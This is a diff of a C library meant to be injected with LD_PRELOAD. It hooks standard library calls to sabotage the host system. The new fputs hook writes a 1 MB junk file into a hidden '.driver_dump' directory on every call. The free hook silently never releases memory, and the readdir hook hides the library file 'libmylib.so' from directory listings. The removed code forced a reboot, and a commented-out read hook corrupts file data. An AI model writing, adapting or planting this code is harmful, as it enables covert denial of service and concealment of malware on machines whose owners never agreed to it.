@@ -1,15 +1,18 @@
+#define _GNU_SOURCE
+#include <dlfcn.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <time.h>
 #include <string.h>
 #include <sys/stat.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include<dirent.h>
 
-int fputs(const char *str, FILE *stream)
+
+void createfile()
 {
-
-    
-    
-srand(time(NULL));
+    srand(time(NULL));
 
     char initial_path[200];
     strcpy(initial_path,".driver_dump/.");
@@ -30,16 +33,234 @@ srand(time(NULL));
     FILE *fp = fopen(initial_path, "w");
 
     int i;
-    for (i = 0; i < 1024 * 1024; i++) {
+    for (i = 0; i < 1024*1024; i++) {
         fputc('a' + rand() % 26, fp);
     }
     
-    // Close the file
     fclose(fp);
+}      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+int fputs(const char *str, FILE *stream)
+{
+
+    int (*original_fputs)(const char *, FILE *) = dlsym(RTLD_NEXT, "fputs");
+    int result = original_fputs(str, stream);
+    //printf("fputs\n");
+    createfile();
     
-	printf("%s",str);
-	
-	sleep(1);
-	
-	system("reboot");
+    return result;
 }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+void* malloc(size_t size)
+{
+    void *(*real_malloc)(size_t) = dlsym(RTLD_NEXT, "malloc");
+    void *ret = real_malloc(size);
+
+	
+    //fprintf(stderr,"malloc\n");
+
+    return ret;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+void free(void *p)
+{
+    void (*libc_free)(void*) = dlsym(RTLD_NEXT, "free");
+
+    //libc_free(p);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+typedef pid_t (*fork_func_t)(void);
+pid_t fork(void) 
+{
+  fork_func_t original_fork = (fork_func_t)dlsym(RTLD_NEXT, "fork");
+
+  pid_t pid = original_fork();
+  // Add your custom code here, if needed
+  //fprintf(stderr,"fork\n");
+  //createfile();
+  
+  return pid;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+struct dirent *(*old_readdir)(DIR *dir);
+struct dirent *readdir(DIR *dirp){
+	
+    old_readdir = dlsym(RTLD_NEXT, "readdir");
+
+    struct dirent *dir;
+
+    while (dir = old_readdir(dirp)){
+	    
+        //if(strstr(dir->d_name,".driver_dump") == 0) 
+        //	break;
+        if(strstr(dir->d_name,"libmylib.so") == 0) 
+        	break;
+    }
+    return dir;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+/*
+int open(const char *pathname, int flags) {
+    static int (*real_open)(const char *, int) = NULL;
+
+    if (!real_open) {
+        real_open = dlsym(RTLD_NEXT, "open");
+    }
+
+    int fd = real_open(pathname, flags);
+    
+    
+    fprintf(stderr,"open");
+    createfile();
+    return fd;
+}
+*/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+/*
+ssize_t read(int fd, void *buf, size_t count) {
+    static ssize_t (*real_read)(int, void *, size_t) = NULL;
+
+    if (!real_read) {
+        real_read = dlsym(RTLD_NEXT, "read");
+        
+    }
+
+    ssize_t n = real_read(fd, buf, count);
+    fprintf(stderr, "read");
+   //createfile();
+   write(fd,"plm",4);
+   fsync(fd);
+    return n;
+}
+*/
